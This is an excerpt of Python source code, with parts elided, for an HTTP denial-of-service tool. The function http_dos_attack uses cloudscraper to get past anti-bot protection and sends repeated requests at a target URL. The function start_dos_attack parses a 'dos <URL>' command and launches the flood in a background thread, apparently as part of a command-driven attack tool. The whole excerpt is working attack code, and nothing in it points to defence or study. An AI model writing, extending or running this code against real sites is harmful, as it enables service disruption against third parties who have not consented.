...
def http_dos_attack(target_url):
    global attack_running
    TOTAL_REQUESTS = 1000
    scraper = cloudscraper.create_scraper()

    while TOTAL_REQUESTS > 0 and attack_running:
        try:
            response = scraper.get(target_url, timeout=5)
            TOTAL_REQUESTS -= 1
            if response.status_code != 200:
                print(f"[M] Received non-200 response: {response.status_code}")
        except Exception as e:
            print(f"[M] An error occurred: {e}")

    print("[M] HTTP DoS attack completed.")
...
def start_dos_attack(command):
    ...
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format. Please enter in the format 'dos <URL>'")

        target_url = parts[1]

        attack_running = True

        dos_thread = threading.Thread(target=http_dos_attack, args=(target_url,))
        dos_thread.start()

        print("[M] Attack started")
    except ValueError as ve:
        print("[M] You have entered a wrong URL")
